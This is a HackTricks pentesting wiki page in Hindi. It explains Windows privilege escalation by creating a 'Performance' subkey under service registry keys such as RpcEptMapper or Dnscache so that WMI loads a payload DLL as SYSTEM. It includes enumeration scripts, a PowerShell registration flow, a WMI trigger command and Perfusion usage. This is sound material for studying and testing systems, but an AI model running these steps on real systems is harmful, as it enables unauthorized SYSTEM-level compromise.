# Service Registry पर AppendData/AddSubdirectory Permission

{{#include ../../banners/hacktricks-training.md}}

**The original post is** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)<sup>[[3]](#references)</sup>

## Summary

यदि आपके पास किसी service registry key पर केवल **`Create Subkey`** / **`AppendData/AddSubdirectory`** permissions हैं, तो भी यह privesc के लिए एक अच्छा lead है। आमतौर पर आप `ImagePath`, `ServiceDll` या अन्य मौजूदा values को सीधे **overwrite** नहीं कर सकते, लेकिन फिर भी आप इनके अंतर्गत एक **`Performance`** child key बना सकते हैं:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- कोई भी अन्य **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** key, जहाँ आपके token के पास **`KEY_CREATE_SUB_KEY`** हो

यह तरकीब इस तथ्य पर आधारित है कि Windows अभी भी legacy **PerfLib V1** registration model को support करता है। यदि किसी service में **`Performance`** subkey है, तो जब कोई performance counter consumer data का अनुरोध करता है, Windows वहाँ से एक DLL load कर सकता है।

Microsoft documentation के अनुसार, minimum registration यह है:<sup>[[1]](#references)</sup>
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
इसलिए offensive takeaway है: **किसी service registry finding को केवल इसलिए discard न करें क्योंकि आपको `SetValue` के बजाय सिर्फ `CreateSubKey` मिला है**।<sup>[[3]](#references)</sup>

## यह code execution के लिए पर्याप्त क्यों है

इन services पर `Performance` subkey आमतौर पर default रूप से मौजूद **नहीं** होती, इसलिए आपको **`KEY_CREATE_SUB_KEY`** primitive की आवश्यकता होती है। एक बार key मौजूद हो जाए और उसमें `Library`/`Open`/`Collect`/`Close` मौजूद हों, तो कोई भी **performance counter consumer** DLL load को trigger कर सकता है।<sup>[[3]](#references)</sup>

कुछ महत्वपूर्ण विवरण:

- **`Library`** value किसी **पूर्ण DLL path** की ओर point कर सकती है।
- DLL को **`OpenPerfData`**, **`CollectPerfData`**, और **`ClosePerfData`** export करने होंगे और `ERROR_SUCCESS` return करना होगा।
- Code **consumer के context** में चलता है, **जरूरी नहीं कि vulnerable service process में ही**।
- Classic `RpcEptMapper` / `Dnscache` case में, एक **WMI performance query** **`wmiprvse.exe`** से DLL को **`NT AUTHORITY\SYSTEM`** के रूप में load करवा सकती है।

इसी कारण triage के दौरान यह primitive आसानी से छूट जाती है: parent service key "पूरी तरह writable" नहीं होती, लेकिन फिर भी इसका weaponization किया जा सकता है।

## Quick enumeration

**AccessChk** के साथ manual spot-check:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
service keys पर **`CreateSubKey`** वाले low-privileged principals को खोजने का PowerShell example:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
उपयोगी tooling:

- **PrivescCheck**: `Get-ModifiableRegistryPath` विशेष रूप से इस प्रकार की समस्या पहचानने के लिए बनाया गया था।<sup>[[3]](#references)</sup>
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: legacy vulnerable targets पर DLL drop, `Performance` registration, WMI trigger, token duplication और cleanup को automate करता है (उदाहरण के लिए: `Perfusion.exe -c cmd -i -k Dnscache`)।<sup>[[4]](#references)</sup>

## Abuse flow

`Performance` subkey बनाएं और आवश्यक values भरें:<sup>[[3]](#references)</sup>
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
इसके बाद एक **privileged** performance consumer को trigger करें। `Win32_Perf*` classes पर WMI query इसका एक classic example है:<sup>[[3]](#references)</sup>
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
ऑपरेशनल नोट्स:

- **`perfmon.exe`** लॉन्च करना यह सत्यापित करने के लिए उपयोगी है कि counter registration सही है, लेकिन इससे आमतौर पर DLL केवल **आपके अपने user context** में load होती है।
- वास्तविक LPE के लिए **privileged** consumer, जैसे **WMI**, को trigger करें।
- यदि आप अपना exploit लिख रहे हैं, तो DLL के अंदर से सीधे `cmd.exe` spawn करने पर आमतौर पर आपको **session 0** में shell मिलता है। `Perfusion` privileged token को attacker के session में suspended अवस्था में बनाए गए process में duplicate करके इस समस्या को हल करता है।<sup>[[4]](#references)</sup>
- DLL architecture को target consumer से match करें (**x64 on x64 systems**)।

## Version notes / हाल के developments

Historically, built-in weak keys ये थीं:<sup>[[4]](#references)</sup>

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` और `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion` के अनुसार, **April 2021** updates ने updated **Windows 8 / Windows Server 2012** पर आसान exploitation path हटा दिया, जबकि **Windows 7 / Windows Server 2008 R2** में **`Dnscache`** के माध्यम से exploitation संभव रहा।<sup>[[4]](#references)</sup>

यह primitive **केवल historical नहीं है**। **January 2025** में Microsoft ने एक संबंधित AD DS issue को patch किया, जिसमें **`Network Configuration Operators`** के members **`Dnscache`** और **`NetBT`** के अंतर्गत subkeys बना सकते थे, और supported systems पर **SYSTEM** तक पहुंचने के लिए उसी **Performance-counter DLL registration** idea का दोबारा उपयोग किया जा सकता था।<sup>[[2]](#references)</sup>

इसलिए modern lesson generic है: जब भी किसी low-privileged principal के पास **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** पर **`CreateSubKey`** हो, तो finding को dismiss करने से पहले जांचें कि क्या **`Performance`** child key पर्याप्त है।

## References

- [1] [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [2] [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
- [3] [itm4n - Windows RpcEptMapper Service Insecure Registry Permissions EoP](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
- [4] [itm4n - Perfusion (exploit for the RpcEptMapper registry key permissions vulnerability)](https://github.com/itm4n/Perfusion)

{{#include ../../banners/hacktricks-training.md}}
